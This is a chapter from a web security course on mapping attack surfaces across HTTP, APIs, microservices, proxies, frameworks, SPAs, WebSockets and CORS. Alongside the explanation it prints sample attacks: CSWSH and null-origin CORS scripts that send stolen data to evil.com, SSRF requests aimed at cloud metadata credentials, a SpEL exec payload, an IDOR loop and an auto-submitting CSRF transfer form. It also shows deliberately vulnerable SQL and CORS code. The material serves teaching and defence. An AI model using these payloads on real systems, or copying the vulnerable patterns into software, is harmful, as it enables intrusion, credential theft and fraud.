# Modern Web Architecture: Attack Surface Mapping

## 1. The Browser-Server Interaction Model

### 1.1 HTTP Fundamentals and Security-Relevant Semantics

The Hypertext Transfer Protocol governs virtually all web communication. Understanding its mechanics at the specification level is prerequisite to identifying and exploiting web vulnerabilities. HTTP/1.1, defined in RFC 7230-7235 (and now RFC 9110-9114 as the "HTTP Core" specifications), establishes a request-response model where every message consists of a start line, headers, and an optional body.

A typical HTTP request reveals multiple attack surfaces encoded in its structure:

```http
GET /api/v2/users/1337/profile HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
Accept: application/json
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: session=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxMzd9; csrf_token=a3f2b7c9d1e4
Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6ImtleS0xIn0...
X-Forwarded-For: 10.0.0.5
X-Real-IP: 10.0.0.5
Content-Type: application/json
```

Each header introduces a potential attack vector. The `Host` header is the foundational routing mechanism for virtual hosting — its manipulation enables HTTP request smuggling, cache poisoning, and password reset poisoning. The `X-Forwarded-For` and `X-Real-IP` headers are frequently trusted by applications for IP-based access control without validation, enabling spoofing attacks. The `Authorization` header carries bearer tokens that, if leaked via logs orReferer headers, enable account takeover.

HTTP/1.1 connection management via `Connection: keep-alive` creates persistent TCP connections that enable request smuggling when intermediaries disagree on message boundaries. The `Transfer-Encoding: chunked` header, when processed inconsistently across proxies and backends, enables CL.TE and TE.CL smuggling attacks (detailed in `04b_deserialization_race_conditions.md`).

### 1.2 HTTPS and TLS in Web Context

HTTPS wraps HTTP inside TLS, providing confidentiality, integrity, and server authentication. The TLS handshake negotiates protocol version and cipher suite before any HTTP data is exchanged:

```
ClientHello (TLS 1.3 supported versions: 0x0304)
  → key_share: x25519 public key
  → signature_algorithms: rsa_pss_rsae_sha256, ecdsa_secp256r1_sha256

ServerHello (selected version: 0x0304 / TLS 1.3)
  ← key_share: x25519 public key
  ← cipher_suite: TLS_AES_256_GCM_SHA384

[EncryptedExtensions, Certificate, CertificateVerify, Finished]
[Client Finished]
[Application Data: HTTP request/response]
```

TLS 1.3 (RFC 8446) eliminated legacy cipher suites, removed renegotiation, and mandated forward secrecy. However, many servers still support TLS 1.0/1.1 for compatibility, exposing them to BEAST (CVE-2011-3389), POODLE (CVE-2014-3566), and RC4 bias attacks. TLS configuration errors remain among OWASP A02 (Cryptographic Failures).

Key TLS attack surfaces in web context:

- **ALPN negotiation**: Application-Layer Protocol Negotiation allows advertising HTTP/2 (`h2`) support. Misconfigured servers may fall back to HTTP/1.1, removing HTTP/2's frame-based message boundary protections.
- **Client certificate authentication**: Rarely used in public-facing web apps but common in mutual-TL (mTLS) microservice architectures. Stolen client certificates enable service impersonation.
- **SNI (Server Name Indication)**: Leaks the hostname in cleartext during the TLS handshake. Encrypted Client Hello (ECH, formerly ESNI) attempts to mitigate this but adoption remains limited.
- **Certificate pinning bypass**: HTTPS pinning is effectively deprecated on mobile/web. Certificate transparency logs (RFC 6962) have replaced pinning as the primary mechanism for detecting rogue certificates.

### 1.3 HTTP/2 and HTTP/3 Attack Surfaces

HTTP/2 (RFC 7540, updated by RFC 9113) introduces a binary framing layer with multiplexed streams over a single TCP connection. This creates novel attack surfaces:

```
HTTP/2 Connection Preface: PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n

SETTINGS Frame (type=0x04):
  SETTINGS_MAX_CONCURRENT_STREAMS (0x03): 100
  SETTINGS_INITIAL_WINDOW_SIZE (0x04): 65535
  SETTINGS_MAX_FRAME_SIZE (0x05): 16384

HEADERS Frame (type=0x01, stream_id=1):
  :method: GET
  :path: /api/users
  :scheme: https
  :authority: target.example.com

DATA Frame (type=0x00, stream_id=1):
  [response body]
```

HTTP/2-specific vulnerabilities include:

- **HPACK side channels**: The Huffman coding used in HPACK header compression can leak information via timing side channels (CVE-2021-33126 through CVE-2021-33129 in certain HPACK implementations).
- **Stream multiplexing abuse**: An attacker can open many concurrent streams to exhaust server stream concurrency limits, causing denial of service. The `SETTINGS_MAX_CONCURRENT_STREAMS` parameter is frequently misconfigured.
- **HTTP/2 Rapid Reset (CVE-2023-44487)**: Attackers send RST_STREAM immediately after HEADERS, rapidly cycling through streams. This bypasses concurrency limits and was exploited against Cloudflare, Google, and AWS in August 2023. The attack achieved request rates of up to 201 million requests per second.
- **HTTP/2 connection coalescing**: When multiple origins share an IP and certificate, HTTP/2 allows connection coalescing. Misconfigurations can lead to cross-origin request routing.
- **H2C (HTTP/2 Cleartext) smuggling**: Servers that upgrade plaintext HTTP/1.1 connections to HTTP/2 via the `Upgrade: h2c` header create a discrepancy between proxy and backend protocol interpretation.

HTTP/3 (RFC 9114) uses QUIC (RFC 9000) as its transport, operating over UDP. QUIC provides built-in encryption (TLS 1.3 inside QUIC), eliminates TCP head-of-line blocking, and supports connection migration (roaming between networks). Attack surfaces include:

- **UDP amplification**: QUIC servers respond to initial packets, creating amplification potential. RFC 9000 Section 8.1 requires address validation before sending more than 3x the received data, but implementations may not enforce this.
- **Connection ID tracking**: QUIC connection IDs enable connection migration but also create a tracking vector for user devices across networks.
- **0-RTT replay attacks**: QUIC's 0-RTT feature allows replaying the client's first flight, potentially replaying non-idempotent requests (POST, PUT) if the application doesn't implement anti-replay.
- **QUIC version negotiation downgrade**: An active network attacker can force version negotiation to a weaker QUIC version.

---

## 2. API Paradigms and Security Models

### 2.1 REST API Security

REST (Representational State Transfer) APIs dominate modern web services. Their security model centers on stateless requests carrying authentication tokens:

```http
POST /api/v1/users HTTP/1.1
Host: api.target.com
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IjEifQ...
X-Request-ID: 550e8400-e29b-41d4-a716-446655440000

{
  "username": "newuser",
  "email": "user@example.com",
  "role": "admin"
}
```

The `role` field in this request exemplifies mass assignment vulnerability (A01: Broken Access Control). If the API accepts arbitrary fields without filtering, an attacker can escalate privileges by including `role`, `is_admin`, or `password_hash` fields.

REST security testing requires methodical coverage of the CRUD matrix:

| HTTP Method | Path | Expected Auth Level | Common Vulnerabilities |
|-------------|------|---------------------|----------------------|
| GET | /api/v1/users | Admin | IDOR via sequential IDs |
| POST | /api/v1/users | Admin | Mass assignment, injection |
| PUT | /api/v1/users/{id} | Resource owner | IDOR, privilege escalation |
| PATCH | /api/v1/users/{id} | Resource owner | Partial update abuse |
| DELETE | /api/v1/users/{id} | Admin | Missing auth check |
| OPTIONS | /api/v1/users | None | Information leakage via CORS headers |

REST APIs frequently use predictable resource identifiers (auto-incrementing integers, UUIDs with insufficient entropy). Testing for IDOR (Insecure Direct Object Reference) involves systematically replacing identifiers in requests:

```python
import requests

session = requests.Session()
session.headers.update({"Authorization": f"Bearer {user_token}"})

for user_id in range(1, 1000):
    resp = session.get(f"https://api.target.com/api/v1/users/{user_id}")
    if resp.status_code == 200:
        data = resp.json()
        # Check if we can access another user's data
        if data.get("id") != current_user_id:
            print(f"IDOR: Can access user {user_id} data: {data}")
```

### 2.2 GraphQL Security Model

GraphQL exposes a single endpoint (typically `/graphql` or `/api/graphql`) with an expressive query language that fundamentally changes the attack surface:

```graphql
query {
  user(id: 1) {
    name
    email
    posts {
      title
      comments {
        body
        author {
          name
          email
          salary        # Field-level authorization bypass
          ssn           # Sensitive data exposure
        }
      }
    }
  }
}
```

GraphQL's type system enables introspection queries that map the entire API schema:

```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      fields {
        name
        type { name }
        args {
          name
          type { name }
        }
      }
    }
  }
}
```

Introspection is often left enabled in production, providing attackers with a complete API blueprint. Specific GraphQL attacks are covered in detail in `03b_api_security.md`.

### 2.3 gRPC Security

gRPC uses HTTP/2 as its transport and Protocol Buffers (protobuf) for serialization. The wire format is binary, making traditional interception more challenging but introducing unique attack surfaces:

```
gRPC Request (HTTP/2 HEADERS frame):
  :method: POST
  :path: /package.Service/Method
  :scheme: http
  content-type: application/grpc
  te: trailers
  grpc-encoding: gzip
  grpc-timeout: 5S

gRPC Request (HTTP/2 DATA frame):
  [protobuf-encoded binary payload]

gRPC Response (HTTP/2 HEADERS frame):
  grpc-status: 0  (OK)
  grpc-message: 
  content-type: application/grpc+proto
```

gRPC-specific security considerations:

- **protobuf reflection**: Analogous to GraphQL introspection, gRPC server reflection (`grpc.reflection.v1.ServerReflection`) exposes all registered services and methods. Tools like `grpcurl` and `grpcui` exploit this for reconnaissance.
- **message serialization attacks**: Protobuf's varint encoding and repeated fields enable amplification attacks — a small wire-encoded message can deserialize into a massive object tree.
- **HTTP/2 dependency**: gRPC requires HTTP/2, making it susceptible to all HTTP/2 attacks (rapid reset, stream multiplexing abuse) described earlier.
- **metadata headers**: gRPC uses custom HTTP/2 headers (`grpc-*`, `x-*`) for authentication and metadata. These bypass traditional WAF inspection when gRPC traffic is tunneled through HTTP/2 proxies.
- **streaming RPCs**: Server-streaming and bidirectional-streaming RPCs maintain persistent connections, enabling resource exhaustion and timing attacks.

---

## 3. Microservices Architecture: Exploded Attack Surface

### 3.1 Service Mesh and Inter-Service Communication

Modern web applications are rarely monolithic. A typical deployment spans dozens or hundreds of microservices communicating over internal networks. This architecture explodes the attack surface from a single ingress point to O(n²) potential communication paths:

```
[Internet]
    │
    ▼
[Load Balancer / API Gateway]
    │
    ├──► [Auth Service :8443] ──► [User DB :5432]
    │         │
    │         ├──► [Session Store :6379]  (Redis)
    │         │
    │         └──► [OAuth Provider :9443]
    │
    ├──► [Product Service :8080] ──► [Product DB :5432]
    │         │
    │         └──► [Cache Layer :6379]
    │
    ├──► [Order Service :8081] ──► [Order DB :5432]
    │         │                     [Message Queue :5672]
    │         ├──► [Payment Service :8082] ──► [Payment Gateway :443]
    │         │         └──► [Vault :8200]
    │         │
    │         └──► [Notification Service :8083] ──► [SMTP :587]
    │
    └──► [Analytics Service :8084] ──► [Time-Series DB :8086]
```

Each arrow represents a potential SSRF target, privilege escalation path, or data exfiltration channel. The API gateway is the single choke point for external traffic, but lateral movement between services often lacks authentication.

**Service mesh security** (Istio, Linkerd) adds mutual TLS and policy enforcement between services. However, the sidecar proxy model introduces its own vulnerabilities:

- **Istio sidecar injection**: Istio injects Envoy proxies into every pod. The Envoy admin interface (`:15000`) and pilot discovery service (`:15010`) have been found accessible without authentication in default configurations (CVE-2019-15458, and various misconfiguration-driven exposures).
- **mTLS bypass**: Services in the mesh may fall back to plaintext when a sidecar is unavailable or misconfigured. The `PERMISSIVE` mode, common during migrations, simultaneously accepts mTLS and plaintext — meaning an attacker who can reach the service pod directly bypasses the mesh's encryption.
- **Service account token projection**: Kubernetes mounts service account tokens at `/var/run/secrets/kubernetes.io/serviceaccount/token`. These JWTs are often bound to pods with excessive RBAC permissions. SSA (SSRF → Service Account → cluster admin) is a documented attack chain in cloud environments (see `05a_web_exploitation_chains.md`).

### 3.2 Internal Service Enumeration via SSRF

When an external-facing service can be coaxed into making requests to internal services, the entire microservices architecture becomes the attack surface. Consider a web application that fetches URL-preview metadata:

```python
# Vulnerable URL preview endpoint
@app.route("/api/preview")
def url_preview():
    url = request.args.get("url")
    resp = requests.get(url, timeout=5)
    return {"title": extract_title(resp.text), "status": resp.status_code}
```

An attacker can enumerate internal services:

```http
GET /api/preview?url=http://auth-service:8443/health HTTP/1.1
GET /api/preview?url=http://payment-service:8082/api/status HTTP/1.1
GET /api/preview?url=http://redis:6379/ HTTP/1.1
GET /api/preview?url=http://vault:8200/v1/sys/health HTTP/1.1
GET /api/preview?url=http://127.0.0.1:6379/INFO HTTP/1.1
GET /api/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
```

The last request targets the AWS instance metadata service, exfiltrating IAM role credentials — the exact chain exploited in the Capital One breach (2019), detailed in `05a_web_exploitation_chains.md`.

---

## 4. CDN, WAF, and Reverse Proxy Boundaries

### 4.1 The Multi-Layer Request Path

A modern web request traverses multiple intermediaries before reaching the application server, creating discrepancies in how each layer interprets the request:

```
Client → CDN (Cloudflare/Fastly) → WAF (AWS WAF/ModSecurity) → Reverse Proxy (nginx/HAProxy) 
  → Application Server (Gunicorn/uWSGI/Tomcat) → Application Code (Django/Flask/Express/Spring)
```

Each arrow represents a security boundary where parsing differences create exploitable gaps. The security model assumes these layers operate consistently, but in practice:

- **CDN caching**: A CDN may cache a response based on URL path, query parameters, and selected headers. If the cache key doesn't include authentication headers, an authenticated response may be served to unauthenticated users (web cache deception).
- **WAF rules vs. application logic**: WAFs operate on pattern matching (signatures, regex). They cannot understand application context — a SQL injection payload that bypasses the WAF may still be exploitable if the application doesn't use parameterized queries.
- **Reverse proxy path normalization**: Nginx normalizes paths (`/../` resolution, percent-decoding) before forwarding to the backend, while the upstream server may re-interpret the path differently, creating path-based access control bypasses.

### 4.2 WAF Architecture and Limitations

Web Application Firewalls inspect HTTP traffic for attack patterns. Commercial WAFs (AWS WAF, Cloudflare WAF, Azure Front Door) and open-source solutions (ModSecurity, Coraza) work by:

1. Parsing the HTTP request into components (path, parameters, headers, body)
2. Applying rule sets that match known attack patterns
3. Taking action on matches (block, log, rate-limit)

Fundamental WAF limitations:

- **Context-free inspection**: WAFs cannot determine whether `SELECT * FROM` in a request body is a SQL injection attempt or a legitimate blog post about SQL. This creates both false positives and false negatives.
- **Parsing discrepancies**: WAFs and application servers may parse the same HTTP request differently. The WAF may see one request while the application processes two (HTTP request smuggling), or the WAF may normalize a path differently than the application (path traversal bypass).
- **Rule coverage gaps**: WAF rule sets (e.g., OWASP Core Rule Set) cover known attack patterns but cannot defend against business logic flaws, IDOR, or novel injection techniques. WAF bypass techniques are detailed in `05b_waf_bypass_techniques.md`.

### 4.3 Reverse Proxy Specific Attacks

Reverse proxies (nginx, HAProxy, Envoy, Caddy) perform critical functions but introduce attack surfaces:

- **Path normalization discrepancies**: Nginx decodes `%2F` to `/` before path-based routing, but some backends treat `%2F` as a literal character. This can bypass path-based ACLs: `GET /admin%2Fdashboard HTTP/1.1` may bypass a WAF rule matching `/admin/*` while the application resolves it to `/admin/dashboard`.
- **Host header routing**: Virtual hosting-based routing trusts the `Host` header for request dispatch. An attacker supplying a malicious `Host` header can trigger password reset poisoning, web cache poisoning, or route to an unexpected backend.
- **Proxy buffering**: Some reverse proxies buffer the entire request body before forwarding, creating a timing differential that enables HTTP request smuggling when a second unbuffered proxy is in the chain.

---

## 5. Web Framework Security Models

### 5.1 Django (Python)

Django provides a "batteries included" security posture with multiple built-in protections:

```python
# settings.py - Django security middleware and settings
MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',      # Sets security headers
    'django.middleware.csrf.CsrfViewMiddleware',          # CSRF token validation
    'django.middleware.clickjacking.XFrameOptionsMiddleware',  # X-Frame-Options
]

SECURE_BROWSER_XSS_FILTER = True
SECURE_CONTENT_TYPE_NOSNIFF = True
SECURE_HSTS_SECONDS = 31536000
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
SECURE_HSTS_PRELOAD = True
SECURE_SSL_REDIRECT = True
SESSION_COOKIE_SECURE = True
SESSION_COOKIE_HTTPONLY = True
CSRF_COOKIE_SECURE = True
CSRF_COOKIE_HTTPONLY = True
```

Django's ORM uses parameterized queries by default, making SQL injection rare in model-based code:

```python
# Safe - Django ORM parameterizes this query
User.objects.filter(username=username)

# Safe - raw SQL with parameters
User.objects.raw("SELECT * FROM auth_user WHERE username = %s", [username])

# VULNERABLE - string interpolation
User.objects.raw(f"SELECT * FROM auth_user WHERE username = '{username}'")
```

However, Django's `extra()` method and raw SQL with `%%s` formatting can bypass ORM protections. Django's `ModelForm` and `ModelSerializer` are susceptible to mass assignment when `exclude` rather than `fields` is used for validation.

### 5.2 Flask (Python)

Flask follows a minimalist philosophy, leaving most security decisions to the developer. Its security model is characterized by what it does NOT provide:

```python
from flask import Flask, request, jsonify

app = Flask(__name__)
app.secret_key = "hardcoded-secret-key"  # Security anti-pattern

@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username")
    password = request.form.get("password")
    # No built-in rate limiting
    # No built-in CSRF protection (WTF_CSRF_ENABLED only in Flask-WTF)
    # No ORM - developer choice (SQLAlchemy, etc.)
    user = db.execute(f"SELECT * FROM users WHERE username = '{username}'").fetchone()
    # VULNERABLE: string formatting in SQL query
```

Flask's `render_template_string` is a notorious SSTI vector (see `02a_injection_attacks.md`). Flask's session implementation uses signed cookies (HMAC-SHA1 by default) — the entire session state is client-visible and only integrity-protected:

```python
# Flask session cookie decoding
# The cookie is: {serialized_data}.{HMAC_signature}
# Data is base64-encoded, NOT encrypted
import base64, zlib, json

def decode_flask_session(cookie_value):
    compressed = cookie_value.startswith('.')  # '.' prefix = compressed
    payload = cookie_value[1:] if compressed else cookie_value
    data = base64.b64decode(payload)
    if compressed:
        data = zlib.decompress(data)
    return json.loads(data)
```

### 5.3 Express.js (Node.js)

Express.js provides minimal built-in security. Security must be added via middleware:

```javascript
const express = require('express');
const helmet = require('helmet');           // Security headers
const cors = require('cors');               // CORS configuration
const rateLimit = require('express-rate-limit');

const app = express();

app.use(helmet());                          // Sets 15 security headers
app.use(cors({ origin: 'https://example.com' }));  // Restricted CORS
app.use(express.json({ limit: '10kb' }));   // Body parsing with size limit

// CSRF protection requires csurf middleware (deprecated) or custom implementation
// No built-in session management - requires express-session
app.use(require('express-session')({
    secret: process.env.SESSION_SECRET,     // Must be cryptographically random
    resave: false,
    saveUninitialized: false,
    cookie: { secure: true, httpOnly: true, sameSite: 'strict' }
}));
```

Express prototype pollution (CVE-2022-24999 et al.) and NoSQL injection via query string parameter pollution are persistent concerns. The `qs` library's parsing of nested objects (`?a[b]=1` → `{a: {b: 1}}`) creates mass assignment vectors when passed directly to MongoDB:

```javascript
// VULNERABLE: Query string parameters directly used in MongoDB query
app.get('/api/users', (req, res) => {
    User.find(req.query)  // ?role=admin → {role: "admin"} → returns all admins
        .then(users => res.json(users));
});
```

### 5.4 Spring Boot (Java)

Spring Boot integrates Spring Security, providing comprehensive but complex configuration:

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .csrf(csrf -> csrf.csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse()))
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/public/**").permitAll()
                .requestMatchers("/api/admin/**").hasRole("ADMIN")
                .anyRequest().authenticated()
            )
            .oauth2ResourceServer(OAuth2ResourceServerConfigurer::jwt)
            .sessionManagement(session -> session
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
            );
        return http.build();
    }
}
```

Spring's most impactful vulnerabilities have been in its data binding and expression evaluation subsystems:

- **Spring4Shell (CVE-2022-22965)**: Class loader manipulation via data binding — `class.module.classLoader.resources.context.parent.pipeline.first.pattern` parameter allowed RCE on JDK9+ through Tomcat's AccessLogValve.
- **Spring Expression Language (SpEL) injection**: `#{T(java.lang.Runtime).getRuntime().exec('id')}` in template rendering or data binding.
- **Spring Cloud Function SpEL injection (CVE-2022-22963)**: Routing function headers evaluated as SpEL expressions.
- **Deserialization via `SerializingHttpSession`**: When Spring Session uses Java serialization, the session store becomes a deserialization attack vector.

---

## 6. Single-Page Application Security

### 6.1 SPA Architecture and Trust Boundaries

Single-Page Applications (React, Angular, Vue) replace server-side rendering with client-side rendering, shifting trust boundaries:

```
Traditional: Browser → Server renders HTML → Browser displays
SPA: Browser loads JS bundle → JS makes API calls → Server returns JSON → JS renders DOM
```

This shift creates several security implications:

- **API-first attack surface**: SPAs expose REST/GraphQL APIs that must be secured independently of the UI. API endpoints cannot rely on UI-level access controls — every API endpoint must enforce its own authorization.
- **Client-side secrets**: SPAs cannot securely store API keys, encryption keys, or secrets. Any value embedded in JavaScript is accessible via browser DevTools or by downloading and inspecting the bundle.
- **State management exposure**: Redux/Vuex stores in browser memory contain application state including potentially sensitive data. XSS gives direct access to `window.__REDUX_DEVTOOLS_EXTENSION__` or the store instance.
- **Route guard bypass**: Angular route guards, React `ProtectedRoute` components, and Vue `beforeEach` navigation guards are client-side enforcement only — they have no effect on direct API calls.

```javascript
// Common SPA anti-pattern: client-side access control
const ProtectedRoute = ({ component: Component, ...rest }) => (
  <Route {...rest} render={(props) => (
    localStorage.getItem('role') === 'admin'   // Client-side check
      ? <Component {...props} />
      : <Redirect to="/login" />
  )} />
);
// This DOES NOT protect /api/admin/* endpoints
```

### 6.2 Token Storage and XSS Interaction

SPAs must store authentication tokens somewhere accessible to JavaScript, creating an inherent tension with XSS protection. The three storage options each have trade-offs:

| Storage | Accessible from JS | XSS Can Read | CSRF Can Send | Survives Tab Close |
|---------|--------------------|--------------|--------------|--------------------|
| localStorage | Yes | Yes | No | Yes |
| sessionStorage | Yes | Yes | No | No |
| HttpOnly Cookie | No | No | Yes (SameSite mitigates) | Yes |
| In-memory only | Yes | Yes | No | No |

The current best practice for SPA token storage uses a hybrid approach:

```javascript
// Access token: in-memory (not persistent, not accessible to XSS across pages)
// Refresh token: HttpOnly, Secure, SameSite=Strict cookie
// This limits XSS damage to the current tab's session lifetime

let accessToken = null;  // Never persisted, only in JS variable

async function login(credentials) {
    const response = await fetch('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(credentials)
    });
    const data = await response.json();
    accessToken = data.access_token;  // Store in memory only
    // Refresh token is set as HttpOnly cookie by the server
}
```

---

## 7. WebSocket Security

### 7.1 WebSocket Protocol and Authentication Gaps

The WebSocket protocol (RFC 6455) upgrades an HTTP connection to a persistent, bidirectional channel:

```http
GET /ws/chat HTTP/1.1
Host: target.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://target.example.com
Cookie: session=abc123
```

WebSocket security fundamentally differs from HTTP because:

1. **Authenticaton occurs only at handshake time**: The opening HTTP request carries authentication (cookies, tokens), but subsequent WebSocket frames do not. Once the connection is established, the server cannot re-authenticate mid-connection.
2. **No CORS enforcement on frames**: After the handshake, the same-origin policy does not apply to WebSocket messages. A malicious page that establishes a WebSocket connection can send arbitrary messages.
3. **No built-in CSRF protection**: Since the WebSocket handshake is an HTTP GET, it's susceptible to CSRF if the server relies solely on cookies for authentication. The `Origin` header is checked during handshake, but this can be spoofed in some configurations.

```python
# Vulnerable WebSocket handler - no authentication after handshake
@socketio.on('message')
def handle_message(data):
    # No authentication check - any connected socket is trusted
    emit('message', data, broadcast=True)  # Broadcasts to all connected clients

# Secure WebSocket handler - subprotocol authentication
@socketio.on('connect')
def handle_connect():
    token = request.args.get('token') or request.headers.get('Authorization')
    if not verify_token(token):
        return False  # Reject connection
```

### 7.2 WebSocket Injection and Cross-Site WebSocket Hijacking

**Cross-Site WebSocket Hijacking (CSWSH)** occurs when a WebSocket endpoint accepts connections cross-origin:

```html
<!-- Attacker's page exploiting CSWSH -->
<script>
    var ws = new WebSocket('wss://target.example.com/ws/chat');
    ws.onopen = function() {
        ws.send(JSON.stringify({action: 'get_sensitive_data'}));
    };
    ws.onmessage = function(event) {
        // Exfiltrate data from the WebSocket connection
        fetch('https://evil.com/exfil', {method: 'POST', body: event.data});
    };
</script>
```

If the WebSocket server relies on cookies for authentication and doesn't validate the `Origin` header, this attack succeeds. The browser automatically sends cookies for `target.example.com`, authenticating the cross-origin connection.

**WebSocket message injection** targets the message parsing logic:

```python
# Server-side message handling
@socketio.on('chat_message')
def handle_chat(data):
    # If data is not validated/sanitized:
    msg = data.get('message', '')
    room = data.get('room', 'general')
    # XSS if msg is rendered in other clients' browsers without escaping
    emit('chat_message', {'user': current_user.name, 'message': msg}, room=room)
    
    # SQL injection if msg is used in queries
    cursor.execute(f"INSERT INTO messages (room, user, content) VALUES ('{room}', '{current_user.id}', '{msg}')")
```

---

## 8. Same-Origin Policy and CORS

### 8.1 Same-Origin Policy Mechanics

The Same-Origin Policy (SOP) is the browser's foundational security mechanism. Two URLs have the same origin if they share the same scheme, host, and port:

```
https://example.com/page1  ← origin: (https, example.com, 443)
https://example.com:443/page2  ← SAME origin (default port for https)
https://example.com:8080/page3  ← DIFFERENT origin (port)
http://example.com/page4  ← DIFFERENT origin (scheme)
https://sub.example.com/page5  ← DIFFERENT origin (host)
```

SOP governs multiple browser APIs with different enforcement policies:

- **DOM access**: Full read/write access only if same origin. Cross-origin frame/window access is blocked.
- **Network requests**: Can be sent cross-origin, but reading the response is blocked unless CORS allows it.
- **Cookies**: Governed by separate cookie scoping rules (domain, path, SameSite attribute).
- **Storage**: localStorage and sessionStorage are strictly scoped to origin. IndexedDB is per-origin.

Key SOP bypass mechanisms and edge cases:

- **`document.domain` relaxation** (deprecated): Previously allowed subdomains to relax SOP by setting `document.domain = 'example.com'`, making `a.example.com` and `b.example.com` same-origin. Removed in Chrome 115 (2023).
- **`postMessage`**: Explicitly bypasses SOP for cross-origin communication. The receiver must validate `event.origin` to prevent message forgery (see `04a_client_side_security.md`).
- **Subresource integrity checks**: SRI (`integrity` attribute on `<script>` and `<link>`) ensures resources haven't been tampered with, but doesn't relax SOP.

### 8.2 CORS Configuration and Misconfiguration

Cross-Origin Resource Sharing (CORS) relaxes SOP under controlled conditions via HTTP headers:

```http
# Preflight request (for non-simple requests)
OPTIONS /api/data HTTP/1.1
Host: api.target.com
Origin: https://evil.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: X-Custom-Header

# Response allowing cross-origin access
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Methods: GET, PUT, DELETE
Access-Control-Allow-Headers: X-Custom-Header
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400
```

The `Access-Control-Allow-Credentials: true` header combined with a specific `Access-Control-Allow-Origin` (not `*`) creates the most dangerous CORS misconfiguration — it allows authenticated cross-origin requests:

```python
# VULNERABLE CORS configuration - reflects Origin header
@app.after_request
def add_cors_headers(response):
    origin = request.headers.get('Origin')
    if origin:
        response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Credentials'] = 'true'
    return response

# This allows ANY origin to make authenticated requests
# Attack: attacker.com can fetch user data via:
# fetch('https://api.target.com/api/user/data', {credentials: 'include'})
```

Common CORS misconfiguration patterns:

1. **Origin reflection**: Server echoes the request `Origin` header in `Access-Control-Allow-Origin`. This nullifies SOP for every origin.
2. **Subdomain trust**: Server allows `*.target.com`, but if any subdomain has XSS, it can be used to exfiltrate data from the main domain.
3. **Null origin**: `Origin: null` is sent by sandboxed iframes and redirect sequences. Some servers allow `null` in CORS, enabling exploitation via `<iframe sandbox="allow-scripts" src="data:...">`.
4. **Pre-domain wildcard matching**: Server checks if origin ends with `target.com`, allowing `eviltarget.com`.
5. **HTTPS → HTTP downgrade**: CORS allows mixed-origin while the browser's mixed-content blocking may not.

```http
# CORS exploit via null origin
GET /api/secret HTTP/1.1
Host: api.target.com
Origin: null
Cookie: session=abc123

# If server responds with:
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

# Exploit via sandboxed iframe:
<iframe sandbox="allow-scripts" src='data:text/html,<script>
fetch("https://api.target.com/api/secret", {credentials:"include"})
.then(r=>r.text()).then(t=>fetch("https://evil.com/exfil?d="+btoa(t)))
</script>'></iframe>
```

### 8.3 CORS and Preflight Bypasses

Not all cross-origin requests trigger preflight checks. Simple requests (GET, HEAD, POST with `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain` content type) bypass CORS preflight:

```http
# This POST request bypasses preflight (simple request)
POST /api/transfer HTTP/1.1
Host: api.target.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=abc123

from=account1&to=account2&amount=10000
```

If an API accepts `application/x-www-form-urlencoded` and doesn't validate the `Origin` header for simple requests, a CSRF-like attack can execute even without CORS preflight. This is particularly dangerous when combined with JSON content-type confusion — some frameworks accept both JSON and form data:

```python
# Flask route that accepts both content types
@app.route('/api/transfer', methods=['POST'])
def transfer():
    # Flask's request.get_json() returns None for form data,
    # but request.form still contains the data
    data = request.get_json(silent=True) or request.form.to_dict()
    # Process transfer...
```

An attacker can forge requests using `application/x-www-form-urlencoded` (simple request, no preflight):

```html
<form action="https://api.target.com/api/transfer" method="POST">
    <input type="hidden" name="from" value="victim_account">
    <input type="hidden" name="to" value="attacker_account">
    <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
```

---

## 9. Cross-Reference Guide

| Topic | Cross-Reference |
|-------|----------------|
| Injection techniques | `02a_injection_attacks.md` |
| Authentication bypass | `02b_authentication_authorization.md` |
| SSRF, CSRF, LFI | `03a_ssrf_csrflfi.md` |
| API security | `03b_api_security.md` |
| Client-side attacks | `04a_client_side_security.md` |
| Deserialization, race conditions | `04b_deserialization_race_conditions.md` |
| Exploitation chains | `05a_web_exploitation_chains.md` |
| WAF bypass | `05b_waf_bypass_techniques.md` |
| Testing methodology | `06a_web_security_testing.md` |
| Hardening | `06b_web_hardening_defense.md` |
| Future directions | `07_web_security_future.md` |
| Chromium SOP implementation | `../Chromium_Architecture_and_Vulnerability/docs/07_network_stack_architecture.md` |
| Cloud SSRF/metadata | `../cloud_security/docs/` |

---

*This chapter establishes the architectural foundations for understanding web application attack surfaces. Subsequent chapters build on these concepts with detailed exploitation techniques and defensive strategies.*

---

## References

1. RFC 9110. "HTTP Semantics." IETF, June 2022. https://www.rfc-editor.org/rfc/rfc9110
2. RFC 9111. "HTTP Caching." IETF, June 2022. https://www.rfc-editor.org/rfc/rfc9111
3. RFC 9112. "HTTP/1.1." IETF, June 2022. https://www.rfc-editor.org/rfc/rfc9112
